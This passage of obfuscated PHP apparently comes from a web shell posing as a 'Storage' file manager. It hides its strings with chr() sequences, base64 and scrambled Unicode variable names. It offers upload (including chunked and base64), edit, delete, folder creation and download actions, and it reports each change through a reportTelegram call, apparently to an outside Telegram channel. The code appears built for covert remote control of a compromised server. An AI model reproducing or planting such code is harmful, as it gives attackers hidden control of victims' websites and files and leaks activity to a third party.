    return array('ok'=>false,'e'=>chr(97).chr(108).chr(108).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(91).implode(', ',$㼁̧̩̈̊).']');
}




function _verify_and_retry($ら̋㻁̧̤́, $ᛚ̨̥̩̊̊, $ᚢᛜ̋ﬗ̈́){
    clearstatcache(true, $ら̋㻁̧̤́);
    if(is_file($ら̋㻁̧̤́)){
        $㉉̩̀̇ = @filesize($ら̋㻁̧̤́);
        if($㉉̩̀̇ === $ᛚ̨̥̩̊̊ && $㉉̩̀̇ > 0){
            return array('ok'=>true, 'size'=>$㉉̩̀̇, 'retry'=>0, 'method'=>'direct');
        }
    }
    $ᛈ̣̈̉́ = 'none';
    for($ᚠ̤̤̂̀ = 1; $ᚠ̤̤̂̀ <= 5; $ᚠ̤̤̂̀++){
        usleep(1000000);
        clearstatcache(true, $ら̋㻁̧̤́);
        if(is_file($ら̋㻁̧̤́)){
            $㉉̩̀̇ = @filesize($ら̋㻁̧̤́);
            if($㉉̩̀̇ === $ᛚ̨̥̩̊̊ && $㉉̩̀̇ > 0){
                return array('ok'=>true, 'size'=>$㉉̩̀̇, 'retry'=>$ᚠ̤̤̂̀, 'method'=>$ᛈ̣̈̉́);
            }
        }
        $ㄉ㉉ᚦ̋ᛗ̥̦ = _write_multi($ら̋㻁̧̤́, $ᚢᛜ̋ﬗ̈́);
        $ᛈ̣̈̉́ = isset($ㄉ㉉ᚦ̋ᛗ̥̦['method']) ? $ㄉ㉉ᚦ̋ᛗ̥̦['method'] : chr(119).chr(114).chr(105).chr(116).chr(101).chr(95).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
        clearstatcache(true, $ら̋㻁̧̤́);
        if(is_file($ら̋㻁̧̤́)){
            $㉉̩̀̇ = @filesize($ら̋㻁̧̤́);
            if($㉉̩̀̇ === $ᛚ̨̥̩̊̊ && $㉉̩̀̇ > 0){
                return array('ok'=>true, 'size'=>$㉉̩̀̇, 'retry'=>$ᚠ̤̤̂̀, 'method'=>$ᛈ̣̈̉́);
            }
        }
    }
    return array('ok'=>false, 'size'=>0, 'retry'=>5, 'method'=>'failed');
}

$ね̄̀̆=isset($_GET['d'])?_clean_rel($_GET['d']):$ᛉ̦̌̄;$㌁㉆㉉̨̨̩=_safe_within($㌁̩ᛉ̩̄̉.DIRECTORY_SEPARATOR.$ね̄̀̆,$㌁̩ᛉ̩̄̉);if($㌁㉆㉉̨̨̩===false){$㌁㉆㉉̨̨̩=$㌁̩ᛉ̩̄̉;$ね̄̀̆='';}
$㉉ᛊᚢね̤̣̌=trim(str_replace($㌁̩ᛉ̩̄̉,'',$㌁㉆㉉̨̨̩),DIRECTORY_SEPARATOR);$㲁̧ᛏ̩̋='';if($㉉ᛊᚢね̤̣̌!==''){$㲁̧ᛏ̩̋=dirname($㉉ᛊᚢね̤̣̌);if($㲁̧ᛏ̩̋==='.')$㲁̧ᛏ̩̋='';}$ᛗﬁ̇=($㉉ᛊᚢね̤̣̌==='');
$㌁̇̊̂̈=isset($_GET['a'])?$_GET['a']:'';


if($㌁̇̊̂̈==='u2'){
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(106).chr(115).chr(111).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
    $ᚢﾚ̌ᚨ̨̌̄=file_get_contents(chr(112).chr(104).chr(112).chr(58).chr(47).chr(47).chr(105).chr(110).chr(112).chr(117).chr(116));
    $ᛃ̤ま́㉆̌=json_decode($ᚢﾚ̌ᚨ̨̌̄,true);
    if(!is_array($ᛃ̤ま́㉆̌)||empty($ᛃ̤ま́㉆̌['n'])||!isset($ᛃ̤ま́㉆̌['b'])){echo json_encode(array('k'=>0,'e'=>chr(98).chr(97).chr(100).chr(32).chr(112).chr(97).chr(121).chr(108).chr(111).chr(97).chr(100)));exit;}
    $ﾚᛏ㉉̤̂=_clean_name($ᛃ̤ま́㉆̌['n']);
    if($ﾚᛏ㉉̤̂===''){echo json_encode(array('k'=>0,'e'=>chr(98).chr(97).chr(100).chr(32).chr(110).chr(97).chr(109).chr(101)));exit;}
    $㈲ﾚﾚ̌̅=$ᛃ̤ま́㉆̌['b'];$ᛇ̆㌁ﬕ̇=strpos($㈲ﾚﾚ̌̅,chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(44));
    if($ᛇ̆㌁ﬕ̇!==false)$㈲ﾚﾚ̌̅=substr($㈲ﾚﾚ̌̅,$ᛇ̆㌁ﬕ̇+7);
    $㈲ﾚﾚ̌̅=str_replace(array(' ','-','_'),array('+','+','/'),$㈲ﾚﾚ̌̅);
    $ﾝᛏ̤̋̃=strlen($㈲ﾚﾚ̌̅)%4;if($ﾝᛏ̤̋̃)$㈲ﾚﾚ̌̅.=str_repeat('=',4-$ﾝᛏ̤̋̃);
    $ᚢᛜ̋ﬗ̈́=base64_decode($㈲ﾚﾚ̌̅,true);
    if($ᚢᛜ̋ﬗ̈́===false){echo json_encode(array('k'=>0,'e'=>chr(98).chr(97).chr(100).chr(32).chr(98).chr(54).chr(52)));exit;}
    if($ᚢᛜ̋ﬗ̈́===''||$ᚢᛜ̋ﬗ̈́===null){echo json_encode(array('k'=>0,'e'=>'empty','retry'=>'chunk'));exit;}
    $ら̋㻁̧̤́=$㌁㉆㉉̨̨̩.DIRECTORY_SEPARATOR.$ﾚᛏ㉉̤̂;
    $ㄉ㉉ᚦ̋ᛗ̥̦=_write_multi($ら̋㻁̧̤́,$ᚢᛜ̋ﬗ̈́);
    if(!$ㄉ㉉ᚦ̋ᛗ̥̦['ok']){echo json_encode(array('k'=>0,'e'=>$ㄉ㉉ᚦ̋ᛗ̥̦['e'],'retry'=>'chunk'));exit;}
    $ﾝᛖ̦̂̊̉=_verify_and_retry($ら̋㻁̧̤́,strlen($ᚢᛜ̋ﬗ̈́),$ᚢᛜ̋ﬗ̈́);
    if(!$ﾝᛖ̦̂̊̉['ok']){echo json_encode(array('k'=>0,'e'=>chr(118).chr(101).chr(114).chr(105).chr(102).chr(121).chr(32).chr(102).chr(97).chr(105).chr(108),'retry'=>'chunk'));exit;}
    $ᚠ̊̆=$ﾝᛖ̦̂̊̉['size'];
    reportTelegram(chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(79).chr(75).chr(58).chr(32).$ﾚᛏ㉉̤̂." ("._size($ᚠ̊̆).chr(41).chr(10).chr(77).chr(101).chr(116).chr(104).chr(111).chr(100).chr(58).chr(32).$ㄉ㉉ᚦ̋ᛗ̥̦['method'].($ﾝᛖ̦̂̊̉['retry']>0?chr(32).chr(40).chr(114).chr(101).chr(116).chr(114).chr(121).chr(32).$ﾝᛖ̦̂̊̉['retry'].")":"").chr(10).chr(68).chr(105).chr(114).chr(58).chr(32).$㉉ᛊᚢね̤̣̌);
    echo json_encode(array('k'=>1,'m'=>'ok '.$ﾚᛏ㉉̤̂.' '._size($ᚠ̊̆).' ['.$ㄉ㉉ᚦ̋ᛗ̥̦['method'].']','method'=>$ㄉ㉉ᚦ̋ᛗ̥̦['method'],'v'=>$ﾝᛖ̦̂̊̉['retry'],'vm'=>$ﾝᛖ̦̂̊̉['method']));
    exit;
}


if($㌁̇̊̂̈==='uc'){
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(106).chr(115).chr(111).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
    $ﾚᛏ㉉̤̂=_clean_name(isset($_GET['n'])?$_GET['n']:'');
    $ᛗね̨̥̦=(int)(isset($_GET['o'])?$_GET['o']:0);
    $ᛊ㉆̨̨̊̃=(int)(isset($_GET['z'])?$_GET['z']:0);
    if($ﾚᛏ㉉̤̂===''){echo json_encode(array('k'=>0,'e'=>chr(98).chr(97).chr(100).chr(32).chr(110).chr(97).chr(109).chr(101)));exit;}
    $ら̋㻁̧̤́=$㌁㉆㉉̨̨̩.DIRECTORY_SEPARATOR.$ﾚᛏ㉉̤̂;
    if($ᛗね̨̥̦===0){@file_put_contents($ら̋㻁̧̤́,'',LOCK_EX);}
    $ᛊ㈲え̨̄̇=file_get_contents(chr(112).chr(104).chr(112).chr(58).chr(47).chr(47).chr(105).chr(110).chr(112).chr(117).chr(116));
    if($ᛊ㈲え̨̄̇===false||$ᛊ㈲え̨̄̇===''){echo json_encode(array('k'=>0,'e'=>chr(101).chr(109).chr(112).chr(116).chr(121).chr(32).chr(99).chr(104).chr(117).chr(110).chr(107)));exit;}
    $ﬗᛖ̣̣=@fopen($ら̋㻁̧̤́,'ab');
    if(!$ﬗᛖ̣̣){echo json_encode(array('k'=>0,'e'=>chr(111).chr(112).chr(101).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108)));exit;}
    $ﬔ㦁̥̩́=@fwrite($ﬗᛖ̣̣,$ᛊ㈲え̨̄̇);@fclose($ﬗᛖ̣̣);
    if($ﬔ㦁̥̩́===false){echo json_encode(array('k'=>0,'e'=>chr(119).chr(114).chr(105).chr(116).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108)));exit;}
    @chmod($ら̋㻁̧̤́,0644);
    if($ᛊ㉆̨̨̊̃){
        clearstatcache(true,$ら̋㻁̧̤́);
        $ᚠ̊̆=@filesize($ら̋㻁̧̤́);
        if($ᚠ̊̆>0){reportTelegram(chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(79).chr(75).chr(32).chr(40).chr(99).chr(104).chr(117).chr(110).chr(107).chr(41).chr(58).chr(32).$ﾚᛏ㉉̤̂." ("._size($ᚠ̊̆).chr(41).chr(10).chr(68).chr(105).chr(114).chr(58).chr(32).$㉉ᛊᚢね̤̣̌);}
    }
    echo json_encode(array('k'=>1,'w'=>$ﬔ㦁̥̩́,'done'=>$ᛊ㉆̨̨̊̃?1:0));
    exit;
}


if($㌁̇̊̂̈==='u1'){
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(106).chr(115).chr(111).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
    if(empty($_FILES['f'])){echo json_encode(array('k'=>0,'e'=>chr(110).chr(111).chr(32).chr(102).chr(105).chr(108).chr(101)));exit;}
    $㌁̦̂̉̅=$_FILES['f'];
    if($㌁̦̂̉̅['error']!==UPLOAD_ERR_OK){echo json_encode(array('k'=>0,'e'=>chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(101).chr(114).chr(114).chr(32).$㌁̦̂̉̅['error']));exit;}
    $ﾚᛏ㉉̤̂=_clean_name($㌁̦̂̉̅['name']);
    if($ﾚᛏ㉉̤̂===''){echo json_encode(array('k'=>0,'e'=>chr(98).chr(97).chr(100).chr(32).chr(110).chr(97).chr(109).chr(101)));exit;}
    $ᚢᛜ̋ﬗ̈́=@file_get_contents($㌁̦̂̉̅[chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)]);
    if($ᚢᛜ̋ﬗ̈́===''||$ᚢᛜ̋ﬗ̈́===false){echo json_encode(array('k'=>0,'e'=>chr(101).chr(109).chr(112).chr(116).chr(121).chr(32).chr(102).chr(105).chr(108).chr(101)));exit;}
    $ら̋㻁̧̤́=$㌁㉆㉉̨̨̩.DIRECTORY_SEPARATOR.$ﾚᛏ㉉̤̂;
    $ㄉ㉉ᚦ̋ᛗ̥̦=_write_multi($ら̋㻁̧̤́,$ᚢᛜ̋ﬗ̈́);
    if(!$ㄉ㉉ᚦ̋ᛗ̥̦['ok']){echo json_encode(array('k'=>0,'e'=>$ㄉ㉉ᚦ̋ᛗ̥̦['e']));exit;}
    $ﾝᛖ̦̂̊̉=_verify_and_retry($ら̋㻁̧̤́,strlen($ᚢᛜ̋ﬗ̈́),$ᚢᛜ̋ﬗ̈́);
    if(!$ﾝᛖ̦̂̊̉['ok']){echo json_encode(array('k'=>0,'e'=>chr(118).chr(101).chr(114).chr(105).chr(102).chr(121).chr(32).chr(102).chr(97).chr(105).chr(108)));exit;}
    reportTelegram(chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(79).chr(75).chr(32).chr(40).chr(109).chr(112).chr(41).chr(58).chr(32).$ﾚᛏ㉉̤̂." ("._size($ﾝᛖ̦̂̊̉['size']).chr(41).chr(10).chr(77).chr(101).chr(116).chr(104).chr(111).chr(100).chr(58).chr(32).$ㄉ㉉ᚦ̋ᛗ̥̦['method'].($ﾝᛖ̦̂̊̉['retry']>0?chr(32).chr(40).chr(114).chr(101).chr(116).chr(114).chr(121).chr(32).$ﾝᛖ̦̂̊̉['retry'].")":"").chr(10).chr(68).chr(105).chr(114).chr(58).chr(32).$㉉ᛊᚢね̤̣̌);
    echo json_encode(array('k'=>1,'m'=>'ok '.$ﾚᛏ㉉̤̂.' ['.$ㄉ㉉ᚦ̋ᛗ̥̦['method'].']','method'=>$ㄉ㉉ᚦ̋ᛗ̥̦['method'],'v'=>$ﾝᛖ̦̂̊̉['retry'],'vm'=>$ﾝᛖ̦̂̊̉['method']));
    exit;
}


if($㌁̇̊̂̈==='v'){$㌁̦̂̉̅=_clean_name(isset($_GET['f'])?$_GET['f']:'');$ﬆ㌁̉=_safe_within($㌁㉆㉉̨̨̩.DIRECTORY_SEPARATOR.$㌁̦̂̉̅,$㌁̩ᛉ̩̄̉);if($ﬆ㌁̉&&is_file($ﬆ㌁̉)){header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(116).chr(101).chr(120).chr(116).chr(47).chr(112).chr(108).chr(97).chr(105).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));readfile($ﬆ㌁̉);exit;}_flash(chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100));header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(61).urlencode($㉉ᛊᚢね̤̣̌));exit;}
if($㌁̇̊̂̈==='e'){$㌁̦̂̉̅=_clean_name(isset($_GET['f'])?$_GET['f']:'');$ﬆ㌁̉=_safe_within($㌁㉆㉉̨̨̩.DIRECTORY_SEPARATOR.$㌁̦̂̉̅,$㌁̩ᛉ̩̄̉);if(!$ﬆ㌁̉||!is_file($ﬆ㌁̉)){_flash(chr(98).chr(97).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101));header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(61).urlencode($㉉ᛊᚢね̤̣̌));exit;}if($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)]==='POST'){$ぁﬕ̧̋=isset($_POST['c'])?$_POST['c']:'';_flash(@file_put_contents($ﬆ㌁̉,$ぁﬕ̧̋)!==false?'saved':chr(115).chr(97).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108));reportTelegram("Edit: ".$㌁̦̂̉̅.chr(10).chr(68).chr(105).chr(114).chr(58).chr(32).$㉉ᛊᚢね̤̣̌);header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(61).urlencode($㉉ᛊᚢね̤̣̌));exit;}$ぁﬕ̧̋=htmlspecialchars((string)@file_get_contents($ﬆ㌁̉),ENT_QUOTES,'UTF-8');echo'<!doctype html><meta charset="utf-8"><title>E</title><style>body{font-family:Arial;background:#f4f4f4;padding:15px;font-size:13px}.w{background:#fff;padding:14px;border-radius:8px;box-shadow:0 0 6px #ccc;max-width:900px;margin:auto}textarea{width:100%;height:420px;font-family:monospace;font-size:13px;padding:6px;border:1px solid #ccc;border-radius:4px}.b{background:#007bff;color:#fff;padding:6px 12px;border:none;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;font-size:12px}.g{background:#6c757d}</style><div class="w"><h3 style="margin:0 0 8px 0">'.htmlspecialchars($㌁̦̂̉̅).chr(60).chr(47).chr(104).chr(51).chr(62).chr(60).chr(102).chr(111).chr(114).chr(109).chr(32).chr(109).chr(101).chr(116).chr(104).chr(111).chr(100).chr(61).chr(34).chr(112).chr(111).chr(115).chr(116).chr(34).chr(62).chr(60).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(32).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).chr(99).chr(34).chr(62).$ぁﬕ̧̋.chr(60).chr(47).chr(116).chr(101).chr(120).chr(116).chr(97).chr(114).chr(101).chr(97).chr(62).chr(60).chr(98).chr(114).chr(62).chr(60).chr(98).chr(114).chr(62).chr(60).chr(98).chr(117).chr(116).chr(116).chr(111).chr(110).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(98).chr(34).chr(32).chr(116).chr(121).chr(112).chr(101).chr(61).chr(34).chr(115).chr(117).chr(98).chr(109).chr(105).chr(116).chr(34).chr(62).chr(83).chr(97).chr(118).chr(101).chr(60).chr(47).chr(98).chr(117).chr(116).chr(116).chr(111).chr(110).chr(62).chr(32).chr(60).chr(97).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(98).chr(32).chr(103).chr(34).chr(32).chr(104).chr(114).chr(101).chr(102).chr(61).chr(34).chr(63).chr(100).chr(61).urlencode($㉉ᛊᚢね̤̣̌).chr(34).chr(62).chr(66).chr(97).chr(99).chr(107).chr(60).chr(47).chr(97).chr(62).chr(60).chr(47).chr(102).chr(111).chr(114).chr(109).chr(62).chr(60).chr(47).chr(100).chr(105).chr(118).chr(62);exit;}
if($㌁̇̊̂̈==='x'){$㌁̦̂̉̅=_clean_name(isset($_GET['f'])?$_GET['f']:'');$ﬆ㌁̉=_safe_within($㌁㉆㉉̨̨̩.DIRECTORY_SEPARATOR.$㌁̦̂̉̅,$㌁̩ᛉ̩̄̉);if(!$ﬆ㌁̉){_flash(chr(98).chr(97).chr(100).chr(32).chr(112).chr(97).chr(116).chr(104));header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(61).urlencode($㉉ᛊᚢね̤̣̌));exit;}if(is_dir($ﬆ㌁̉)){_flash(_rmdir_rec($ﬆ㌁̉)?chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100):'fail');reportTelegram(chr(68).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(58).chr(32).$㌁̦̂̉̅.chr(10).chr(68).chr(105).chr(114).chr(58).chr(32).$㉉ᛊᚢね̤̣̌);}elseif(is_file($ﬆ㌁̉)){_flash(@unlink($ﬆ㌁̉)?chr(102).chr(105).chr(108).chr(101).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100):'fail');reportTelegram(chr(68).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(58).chr(32).$㌁̦̂̉̅.chr(10).chr(68).chr(105).chr(114).chr(58).chr(32).$㉉ᛊᚢね̤̣̌);}header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(61).urlencode($㉉ᛊᚢね̤̣̌));exit;}
if($㌁̇̊̂̈==='n'){$ﾚᛏ㉉̤̂=_clean_name(isset($_POST['n'])?$_POST['n']:'');if($ﾚᛏ㉉̤̂!==''){$ᛇ̆㌁ﬕ̇=$㌁㉆㉉̨̨̩.DIRECTORY_SEPARATOR.$ﾚᛏ㉉̤̂;_flash(!file_exists($ᛇ̆㌁ﬕ̇)?(@mkdir($ᛇ̆㌁ﬕ̇,0777,true)?chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100):'fail'):'exists');reportTelegram(chr(78).chr(101).chr(119).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(58).chr(32).$ﾚᛏ㉉̤̂.chr(10).chr(68).chr(105).chr(114).chr(58).chr(32).$㉉ᛊᚢね̤̣̌);}else{_flash(chr(110).chr(97).chr(109).chr(101).chr(32).chr(114).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100));}header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(61).urlencode($㉉ᛊᚢね̤̣̌));exit;}
if($㌁̇̊̂̈==='dl'){$㌁̦̂̉̅=_clean_name(isset($_GET['f'])?$_GET['f']:'');$ﬆ㌁̉=_safe_within($㌁㉆㉉̨̨̩.DIRECTORY_SEPARATOR.$㌁̦̂̉̅,$㌁̩ᛉ̩̄̉);if($ﬆ㌁̉&&is_file($ﬆ㌁̉)){header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(84).chr(114).chr(97).chr(110).chr(115).chr(102).chr(101).chr(114));header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(111).chr(99).chr(116).chr(101).chr(116).chr(45).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109));header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34).basename($ﬆ㌁̉).'"');header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58).chr(32).filesize($ﬆ㌁̉));header(chr(80).chr(114).chr(97).chr(103).chr(109).chr(97).chr(58).chr(32).chr(112).chr(117).chr(98).chr(108).chr(105).chr(99));header(chr(67).chr(97).chr(99).chr(104).chr(101).chr(45).chr(67).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(58).chr(32).chr(109).chr(117).chr(115).chr(116).chr(45).chr(114).chr(101).chr(118).chr(97).chr(108).chr(105).chr(100).chr(97).chr(116).chr(101));readfile($ﬆ㌁̉);exit;}_flash(chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100));header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(61).urlencode($㉉ᛊᚢね̤̣̌));exit;}
$ﬁ㻁̩̩̊̈=_list($㌁㉆㉉̨̨̩);$ᚠえᚢ̨̃́=_flash();

$ね̦̩̄̇=base64_decode(chr(100).chr(88).chr(66).chr(115).chr(98).chr(50).chr(70).chr(107).chr(88).chr(50).chr(49).chr(104).chr(101).chr(70).chr(57).chr(109).chr(97).chr(87).chr(120).chr(108).chr(99).chr(50).chr(108).chr(54).chr(90).chr(81).chr(61).chr(61));
$ﬖ̥̥̈̈=base64_decode(chr(99).chr(71).chr(57).chr(122).chr(100).chr(70).chr(57).chr(116).chr(89).chr(88).chr(104).chr(102).chr(99).chr(50).chr(108).chr(54).chr(90).chr(81).chr(61).chr(61));
$㼁̊̌̌=@ini_get($ね̦̩̄̇);$ᚢ̥̤̀̆́̃=@ini_get($ﬖ̥̥̈̈);
function _to_bytes($ﾝᛖ̦̂̊̉){$ﾝᛖ̦̂̊̉=trim($ﾝᛖ̦̂̊̉);$㉆㦁ﬗ̨̈=substr($ﾝᛖ̦̂̊̉,-1);$ﾚᛏ㉉̤̂=(int)$ﾝᛖ̦̂̊̉;switch(strtoupper($㉆㦁ﬗ̨̈)){case 'G':$ﾚᛏ㉉̤̂*=1073741824;break;case 'M':$ﾚᛏ㉉̤̂*=1048576;break;case 'K':$ﾚᛏ㉉̤̂*=1024;break;}return $ﾚᛏ㉉̤̂;}
$ᚦ̈ᛉ̧ﾚ̤̦̆=_to_bytes($㼁̊̌̌);$㲁ﬕ̩ᚠ̣̥̈=_to_bytes($ᚢ̥̤̀̆́̃);
?>
<!doctype html><html><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><title>Storage</title><style>body{font-family:Arial;background:#f4f4f4;padding:10px;font-size:12px;margin:0}.container{background:#fff;padding:12px;border-radius:8px;box-shadow:0 0 6px #ccc;max-width:1100px;margin:auto}h2{margin:0 0 6px 0;font-size:16px;font-weight:600}.btn{background:#007bff;color:#fff;padding:3px 7px;border-radius:3px;text-decoration:none;border:none;cursor:pointer;display:inline-block;font-size:11px;margin:1px}.btn:hover{opacity:.88}.btn.red{background:#dc3545}.btn.gray{background:#6c757d}.btn.green{background:#28a745}.btn.disabled{background:#ccc;pointer-events:none;opacity:.7}table{width:100%;border-collapse:collapse}th,td{padding:4px 7px;border-bottom:1px solid #eaeaea;text-align:left;font-size:11.5px}th{background:#007bff;color:#fff}tr:hover{background:#f5faff}.alert{background:#eaf7ea;color:#1d6b1d;padding:5px 9px;border-radius:4px;margin-bottom:7px;border:1px solid #bfe3bf;font-size:11.5px}.crumb{background:#fafafa;padding:8px 12px;border-radius:6px;border:1px solid #ddd;margin-bottom:8px;font-size:13px;line-height:2.4;word-break:break-all;font-family:'Consolas','Monaco',monospace}.crumb a{color:#007bff;text-decoration:none;padding:5px 10px;border-radius:4px;display:inline-block;font-weight:500;transition:background .12s,color .12s}.crumb a:hover{background:#007bff;color:#fff;text-decoration:none}.crumb .sep{color:#bbb;margin:0 2px;font-weight:600;font-size:14px}.crumb .cur{color:#fff;font-weight:700;background:#28a745;padding:5px 12px;border-radius:4px;display:inline-block}.crumb .lbl{font-weight:700;color:#555;margin-right:6px;font-family:Arial,sans-serif;font-size:12px}.toolbar{margin-bottom:7px;line-height:1.9}.pathbox{background:#f7f7f7;padding:4px 7px;border-radius:4px;border:1px solid #eee;font-size:10.5px;color:#666;margin-bottom:7px}input[type=text]{padding:3px 5px;min-width:150px;font-size:11px;border:1px solid #ccc;border-radius:3px}input[type=file]{font-size:11px}#pg{display:none;margin-top:5px;background:#eee;height:8px;border-radius:4px;overflow:hidden}#pb{height:100%;width:0;background:#28a745}.st{font-size:10.5px;color:#555;margin-left:4px;font-weight:600}.inline-form{display:inline-block;margin-right:5px;vertical-align:middle}
</style></head><body>
<div class="container"><h2>📦 Storage</h2><?php if($ᚠえᚢ̨̃́):?><div class="alert"><?php echo htmlspecialchars($ᚠえᚢ̨̃́,ENT_QUOTES,'UTF-8');?></div><?php endif;?>
<div class="crumb"><span class="lbl">📂 CWD:</span><?php
$ㄉ̨̩̀̆̈̆=$㌁㉆㉉̨̨̩;$㉉̉̀㉆̧̌̉=explode(DIRECTORY_SEPARATOR,$ㄉ̨̩̀̆̈̆);$ᚨᛃ̊㌁̅̊='';$ら̆̌ᛒ̀=count($㉉̉̀㉆̧̌̉);
foreach($㉉̉̀㉆̧̌̉ as $ﬗ̀ﬅ̈=>$ᛇ̆㌁ﬕ̇):
    if($ᛇ̆㌁ﬕ̇==='')continue;
    $ᚨᛃ̊㌁̅̊.=($ᚨᛃ̊㌁̅̊===''?'':DIRECTORY_SEPARATOR).$ᛇ̆㌁ﬕ̇;
    $㈲̥́̂̈=ltrim(str_replace($㌁̩ᛉ̩̄̉,'',$ᚨᛃ̊㌁̅̊),DIRECTORY_SEPARATOR);
    $ᛃ̅̊̌̀=($ﬗ̀ﬅ̈===$ら̆̌ᛒ̀-1);
    if($ᛃ̅̊̌̀):echo chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(99).chr(117).chr(114).chr(34).chr(62).htmlspecialchars($ᛇ̆㌁ﬕ̇).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62);
